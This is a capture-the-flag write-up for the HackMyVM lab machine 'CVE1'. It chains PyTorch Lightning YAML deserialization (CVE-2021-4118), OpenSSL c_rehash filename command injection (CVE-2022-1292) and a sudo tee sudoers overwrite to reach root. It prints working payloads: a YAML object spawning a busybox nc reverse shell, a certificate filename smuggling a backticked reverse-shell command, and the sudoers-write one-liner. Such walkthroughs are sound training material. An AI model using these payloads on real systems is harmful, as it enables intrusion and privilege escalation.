# CVE1

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| CVE1 | InfayerTS | Beginner | HackMyVM |

**Summary:** The CVE1 machine presents a layered exploitation chain built entirely around real-world CVEs, demonstrating how chaining multiple known vulnerabilities in sequence can lead to full system compromise. Initial reconnaissance exposes a custom web application running on port 9090, titled "Nuclei War Now!", which provides a server-side YAML template editor backed by PyTorch Lightning 1.5.9. This version of PyTorch Lightning is affected by CVE-2021-4118, a critical insecure deserialization vulnerability in its YAML parsing logic: when the application loads a YAML file using `yaml.unsafe_load`, it blindly deserializes arbitrary Python objects, allowing an attacker to embed a specially crafted payload that invokes `subprocess.Popen` to spawn a reverse shell. After landing as `www-data`, inspection of the cron table reveals a scheduled job running `c_rehash` periodically under the `wicca` user's context. The `/etc/ssl/certs/` directory, where `c_rehash` operates, is world-writable. This creates the conditions for CVE-2022-1292, a command injection vulnerability in OpenSSL's legacy `c_rehash` script, which fails to sanitise certificate filenames before passing them to a shell. By planting a `.crt` file whose name embeds a backtick-escaped shell command, the attacker hijacks the next cron execution to receive a shell as `wicca`. From there, `sudo -l` reveals that `wicca` may run `/usr/bin/tee` as root without a password. Consulting GTFOBins, the attacker pipes a permissive sudoers rule through `tee` to write it into `/etc/sudoers.d/`, which grants full unrestricted `sudo` access and ultimately yields a root shell and both flags.

---

## Reconnaissance

**1. Host Discovery**

The engagement began with a network sweep using a PowerShell-based CTF discovery script to identify live virtual machines on the local subnet.

```bash
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.153 08:00:27:A1:4C:A6 VirtualBox
```

The target was identified at `192.168.100.153`. The IP and base URL were stored as shell variables for convenience.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/cve1]
└─$ ip=192.168.100.153 && url=http://$ip
```

**2. Port Scanning**

A full-port Nmap scan with service detection and default scripts was launched against the target.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/cve1]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-09 20:46 WIB
Nmap scan report for 192.168.100.153
Host is up (0.0025s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 3a:9a:6c:98:00:a7:c8:66:94:fe:58:7e:61:a7:f9:e8 (RSA)
|   256 9d:6f:0d:13:02:3c:65:45:79:1b:3d:9b:e2:5e:24:5f (ECDSA)
|_  256 82:ba:54:82:f7:1d:a2:65:fc:9f:25:dc:43:ee:7e:4c (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
9090/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.80 seconds
```

Three ports were open: SSH on 22, a standard Apache instance on port 80, and a second unnamed HTTP service on port 9090.

**3. Web Enumeration**

Port 80 presented only the standard Apache2 Debian default page, containing no application logic or useful attack surface.

![](image.png)

Port 9090, however, hosted a custom PHP application titled "Nuclei War Now!" that exposed two forms: one to save arbitrary content as a `.yaml` file on the server, and another to open and display a stored `.yaml` file by name.

![](image-1.png)

Inspecting the raw HTTP response from port 9090 revealed a critical comment embedded in the HTML source.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/cve1]
└─$ curl -i $url:9090
HTTP/1.1 200 OK
Date: Mon, 09 Mar 2026 13:49:07 GMT
Server: Apache/2.4.54 (Debian)
Vary: Accept-Encoding
Content-Length: 910
Content-Type: text/html; charset=UTF-8

<!DOCTYPE HTML>
<html>
<body style="background-color: rgb(225,225,225)">
<h1>Nuclei War Now!</h1>
    <form name="savefile" method="post" action="">
        File Name: <input type="text" name="filename" value="">.yaml<br/>
        <textarea rows="10" cols="100" name="textdata"></textarea><br/>
        <input type="submit" name="submitsave" value="Save template on the server">
</form>
    <br/><hr style="background-color: rgb(150,150,150); color: rgb(150,150,150); width: 100%; height: 4px;"><br/>
    <form name="openfile" method="post" action="">
        Open File: <input type="text" name="filename" value="">.yaml
        <input type="submit" name="submitopen" value="View content">
</form>
    <br/><hr style="background-color: rgb(150,150,150); color: rgb(150,150,150); width: 100%; height: 4px;"><br/>
    File contents:<br/>
    <!--Backend developed with PyTorch Lightning 1.5.9-->
</body>
</html>
```

The comment `<!--Backend developed with PyTorch Lightning 1.5.9-->` was a significant indicator. PyTorch Lightning 1.5.9 is known to be vulnerable to **CVE-2021-4118**, an insecure YAML deserialization flaw documented at [https://huntr.com/bounties/31832f0c-e5bb-4552-a12c-542f81f111e6](https://huntr.com/bounties/31832f0c-e5bb-4552-a12c-542f81f111e6). The backend passes user-supplied YAML through `yaml.unsafe_load`, which permits the instantiation of arbitrary Python objects, including subprocess calls.

**4. Directory Brute Force**

A Gobuster scan was run against port 9090 to discover any pre-existing files on the server.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/cve1]
└─$ gobuster dir -u $url:9090/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html,js,css,jpg,zip,bak,pem,log,png,yaml
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.153:9090/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              pem,log,png,yaml,php,html,js,zip,bak,txt,css,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 910]
/manual               (Status: 301) [Size: 326] [--> http://192.168.100.153:9090/manual/]
/file.yaml            (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 330] [--> http://192.168.100.153:9090/javascript/]
```

The file `file.yaml` already existed on the server with a zero-byte size. This confirmed that the "open" form loads files by that name from the web root, and the "save" form writes to the same location. The attack path was clear: write a malicious YAML payload to `file.yaml`, then trigger the "View content" action to cause the server to deserialize it.

---

## Initial Access: CVE-2021-4118 (PyTorch Lightning YAML Deserialization RCE)

**5. Crafting the Deserialization Payload**

The exploit payload takes advantage of PyTorch Lightning's use of `yaml.unsafe_load`. By constructing a YAML document that instantiates a `yaml.MappingNode` and invokes `yaml.unsafe_load` as the `extend` function, it is possible to embed a `subprocess.Popen` call within the `listitems` field. When the backend loads this file, Python's YAML engine evaluates the nested object graph and executes the subprocess command, launching a `busybox nc` reverse shell.

```yaml
- !!python/object/new:yaml.MappingNode
  listitems: !!str '!!python/object/apply:subprocess.Popen [["busybox", "nc", "192.168.100.1", "4444", "-e", "/bin/sh"]]'
  state:
    tag: !!str dummy
    value: !!str dummy
    extend: !!python/name:yaml.unsafe_load
```

**6. Setting Up the Listener and Triggering Execution**

A Netcat listener was started on the attacker machine, the payload was saved to `file.yaml` via the web form, and then the "View content" form was used to open `file.yaml`, triggering server-side deserialization and command execution.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/cve1]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The connection arrived immediately. The shell was then upgraded to a fully interactive PTY.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 58212
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@cve-pt1:~$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/cve1]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@cve-pt1:~$ export SHELL=/bin/bash
www-data@cve-pt1:~$ export TERM=xterm-256color
www-data@cve-pt1:~$ stty rows 67 cols 89
```

A foothold as `www-data` was established.

---

## Internal Enumeration

**7. User and Filesystem Discovery**

Inspection of `/etc/passwd` revealed a local user named `wicca`. Their home directory contained a `Backup.zip` and, most importantly, a `user.txt` flag readable only by the owner.

```bash
www-data@cve-pt1:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
wicca:x:1000:1000:wicca,,,:/home/wicca:/bin/bash
www-data@cve-pt1:~$ ls -la /home/wicca/
total 36
drwxr-xr-x 4 wicca wicca 4096 Dec  7  2022 .
drwxr-xr-x 3 root  root  4096 Dec  5  2022 ..
-rw-r----- 1 wicca wicca  889 Dec  7  2022 Backup.zip
lrwxrwxrwx 1 wicca wicca    9 Dec  7  2022 .bash_history -> /dev/null
-rw-r--r-- 1 wicca wicca  220 Dec  5  2022 .bash_logout
-rw-r--r-- 1 wicca wicca 3526 Dec  5  2022 .bashrc
drwxr-xr-x 3 wicca wicca 4096 Dec  5  2022 .cache
drwxr-xr-x 3 wicca wicca 4096 Dec  5  2022 .local
-rw-r--r-- 1 wicca wicca  807 Dec  5  2022 .profile
-r-------- 1 wicca wicca   39 Dec  7  2022 user.txt
```

**8. Cron Job Analysis**

Reviewing the machine's cron jobs under `/etc/cron.d/` uncovered a custom crontab named `cve1` that scheduled several recurring tasks.

```bash
www-data@cve-pt1:/media$ ls -la /etc/cron.d/
total 28
drwxr-xr-x  2 root root 4096 Dec  7  2022 .
drwxr-xr-x 77 root root 4096 Dec  7  2022 ..
-rw-r--r--  1 root root  285 Feb  6  2021 anacron
-rw-r--r--  1 root root  418 Dec  7  2022 cve1
-rw-r--r--  1 root root  201 Jun  7  2021 e2scrub_all
-rw-r--r--  1 root root  712 May 11  2020 php
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
www-data@cve-pt1:/media$ cat /etc/cron.d/cve1
*/1 * * * * www-data python3 /var/www/cve/2021-4118.py
*/1 * * * * www-data sleep 20; python3 /var/www/cve/2021-4118.py
*/1 * * * * www-data sleep 40; python3 /var/www/cve/2021-4118.py
*/1 * * * * wicca c_rehash /etc/ssl/certs/
*/1 * * * * wicca sleep 30; c_rehash /etc/ssl/certs/
*/1 * * * * root python3 /root/0845.py
*/1 * * * * root sleep 20; python3 /root/0845.py
*/1 * * * * root sleep 40; python3 /root/0845.py
```

Three entries stood out immediately. The `wicca` user was running `c_rehash /etc/ssl/certs/` every minute. The `c_rehash` utility is the deprecated OpenSSL certificate rehashing script, and it is affected by **CVE-2022-1292**: it constructs shell commands by concatenating certificate filenames directly into a command string without sanitisation. If a filename contains shell metacharacters such as backticks, those characters are interpreted by the shell when the cron job fires.

**9. Confirming World-Writable Directory**

A permission check on `/etc/ssl/certs/` confirmed that it was world-writable, meaning `www-data` had full write access.

```bash
www-data@cve-pt1:/media$ ls -ld /etc/ssl/certs/
drwxr-xrwx 2 root root 12288 Mar  9 09:46 /etc/ssl/certs/
www-data@cve-pt1:/media$
```

The `drwxr-xrwx` permissions (specifically the trailing `x` on the world-writable bit) confirmed that any user, including `www-data`, could create files inside that directory.

---

## Lateral Movement: CVE-2022-1292 (OpenSSL c_rehash Command Injection)

**10. Planting the Malicious Certificate Filename**

The PoC for CVE-2022-1292 (referenced at https://github.com/alcaparra/CVE-2022-1292) demonstrates that `c_rehash` iterates over files in the target directory and constructs a shell command incorporating each filename. By creating a file whose name contains a backtick-escaped reverse shell command, the attacker causes that command to execute under the context of the user running `c_rehash`, in this case `wicca`.

```bash
www-data@cve-pt1:/media$ cd /etc/ssl/certs/
www-data@cve-pt1:/etc/ssl/certs$ touch "pwn.crt\`busybox nc 192.168.100.1 8888 -e bash\`"
www-data@cve-pt1:/etc/ssl/certs$ echo "-----BEGIN CERTIFICATE-----" > "pwn.crt\`busybox nc 192.168.100.1 8888 -e bash\`"
```

A second Netcat listener was set up on port 8888. Within the next minute, the cron job fired, `c_rehash` processed the poisoned filename, and the embedded command was executed as `wicca`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 58429
python3 -c 'import pty;pty.spawn("/bin/bash")'
wicca@cve-pt1:/etc/ssl/certs$ ^Z
zsh: suspended  nc -lvnp 8888

┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 8888

wicca@cve-pt1:/etc/ssl/certs$ export SHELL=/bin/bash
wicca@cve-pt1:/etc/ssl/certs$ export TERM=xterm
wicca@cve-pt1:/etc/ssl/certs$ stty rows 78 cols 134
wicca@cve-pt1:/etc/ssl/certs$
```

A fully interactive shell as `wicca` was obtained.

---

## Privilege Escalation: sudo tee (GTFOBins File Write)

**11. Enumerating sudo Permissions**

From the `wicca` shell, `sudo -l` was run to enumerate permitted commands.

```bash
wicca@cve-pt1:/etc/ssl/certs$ cd
wicca@cve-pt1:~$ id
uid=1000(wicca) gid=1000(wicca) groups=1000(wicca)
wicca@cve-pt1:~$ sudo -l
```

```bash
wicca@cve-pt1:~$ sudo -l
sudo: unable to resolve host cve-pt1: Temporary failure in name resolution
Matching Defaults entries for wicca on cve-pt1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/bin

User wicca may run the following commands on cve-pt1:
    (root) NOPASSWD: /usr/bin/tee
```

`wicca` could run `/usr/bin/tee` as root without a password. GTFOBins documents this as a privileged file write primitive: since `tee` reads from stdin and writes to any file given as an argument, and since it runs with root's privileges when invoked via `sudo`, it can overwrite or create any file on the system.

![](image-2.png)

**12. Writing a Permissive Sudoers Rule**

The GTFOBins technique was applied directly: a new sudoers drop-in rule was piped through `sudo tee` to write into `/etc/sudoers.d/wicca`, granting `wicca` full, unconditional sudo access.

```bash
wicca@cve-pt1:~$ echo "wicca ALL=(ALL:ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/wicca
wicca@cve-pt1:~$ sudo -i
root@cve-pt1:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
cve-pt1
```

**13. Capturing the Flags**

With a root shell established, both flags were read in a single command.

```bash
root@cve-pt1:~# cat /home/wicca/user.txt /root/root.txt
HMVM{e49[REDACTED]}
HMVM{01c[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance:** Full-port Nmap scanning revealed three open services, with a non-standard HTTP application on port 9090 exposing a server-side YAML template editor built on PyTorch Lightning 1.5.9, disclosed via an HTML comment in the page source.

2. **Vulnerability Discovery:** The PyTorch Lightning version was cross-referenced against public vulnerability databases, confirming CVE-2021-4118. A Gobuster scan further identified the writable `file.yaml` endpoint, confirming arbitrary server-side file write was possible.

3. **Exploitation:** A YAML deserialization payload exploiting `yaml.unsafe_load` was written to `file.yaml` via the save form, then triggered via the open form, yielding a reverse shell as `www-data`.

4. **Internal Enumeration:** Inspection of `/etc/cron.d/cve1` revealed that the `wicca` user ran `c_rehash` against `/etc/ssl/certs/` every minute, and that directory was world-writable. This was cross-referenced with CVE-2022-1292, confirming command injection via crafted filenames.

5. **Privilege Escalation:** After moving laterally to `wicca` via the CVE-2022-1292 cron injection, `sudo -l` showed unrestricted use of `/usr/bin/tee` as root. A permissive sudoers rule was written using `sudo tee`, granting full root access and completing the machine.
